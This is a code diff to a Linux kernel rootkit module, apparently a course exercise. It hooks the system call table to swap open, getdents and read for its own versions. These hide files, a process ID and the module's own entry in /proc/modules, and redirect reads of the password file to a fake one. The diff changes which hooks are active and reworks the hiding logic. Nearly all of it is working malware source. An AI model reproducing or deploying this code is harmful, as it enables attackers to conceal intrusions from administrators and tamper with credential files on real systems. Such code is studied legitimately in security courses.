@@ -40,6 +40,8 @@ void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 
 static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 
+int isSneakyOpened = 0;
+
 asmlinkage int (*original_open)(const char *pathname, int flags);
 asmlinkage long (*original_getdents)(unsigned int fd,
                                      struct linux_dirent *dirent,
@@ -53,10 +55,12 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
 
   if (strcmp(pathname, REAL_PWD) == 0) {
     if (copy_to_user((void *)pathname, FAKE_PWD, sizeof(FAKE_PWD) + 1) != 0) {
-      //  printk(KERN_ALERT "SNEAKY_OPEN:failed to copy_to_user1 \n");
+      printk(KERN_ALERT "SNEAKY_OPEN:failed to copy_to_user1 \n");
       return -1;
     }
   }
+  if (strcmp(pathname, "/proc/modules") == 0)
+    isSneakyOpened = 1;
   return original_open(pathname, flags);
 }
 
@@ -65,7 +69,7 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd,
                                     unsigned int count) {
   long read_len = original_getdents(fd, dirent, count);
   if (read_len < 0) {
-    // printk(KERN_ALERT "SNEKAY_GETDENTS:read_len < 0");
+    printk(KERN_ALERT "SNEKAY_GETDENTS:read_len < 0");
     return read_len;
   }
 
@@ -74,8 +78,7 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd,
   char *init = (char *)dirent;
   for (position = 0; position < read_len;) {
     evil = (struct linux_dirent *)(init + position);
-    if (strncmp(evil->d_name, SNEAKY_PREFIX, SNEAKY_PREFIX_SIZE) == 0 ||
-        strstr(evil->d_name, SNEAKY_MODULE) != NULL ||
+    if (strcmp(evil->d_name, SNEAKY_PREFIX) == 0 ||
         strcmp(evil->d_name, sneaky_pid) == 0) {
 
       memcpy(init + position, init + position + evil->d_reclen,
@@ -98,7 +101,7 @@ asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {
 
   // search in buf to see whether SNEAKY_MODULE is inside it
   sneaky_line = strnstr(buf, SNEAKY_MODULE, ori_value);
-  if (sneaky_line != NULL) {
+  if (sneaky_line != NULL && isSneakyOpened == 1) {
     // find SNEAKY_MODULE
     for (sneaky_line_end = sneaky_line;
          sneaky_line_end < ((char *)buf + ori_value); sneaky_line_end++) {
@@ -109,9 +112,10 @@ asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {
     }
     // cover the SNEAKY_MODULE line
     memcpy(sneaky_line, sneaky_line_end,
-           ((char *)buf + ori_value) - sneaky_line_end);
+           ori_value - (sneaky_line_end - (char *)buf));
     // adjust the size of the return buffer's length
     ori_value -= (int)(sneaky_line_end - sneaky_line);
+    isSneakyOpened = 0;
   }
 
   return ori_value;
@@ -136,13 +140,13 @@ static int initialize_sneaky_module(void) {
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
 
-  original_open = (void *)*(sys_call_table + __NR_open);
-  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+  //  original_open = (void *)*(sys_call_table + __NR_open);
+  //*(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
   original_getdents = (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
-  //  original_read = (void *)*(sys_call_table + __NR_read);
+  // original_read = (void *)*(sys_call_table + __NR_read);
   //*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   // Revert page to read-only
@@ -169,7 +173,7 @@ static void exit_sneaky_module(void) {
 
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_open;
+  //*(sys_call_table + __NR_open) = (unsigned long)original_open;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   //*(sys_call_table + __NR_read) = (unsigned long)original_read;
 
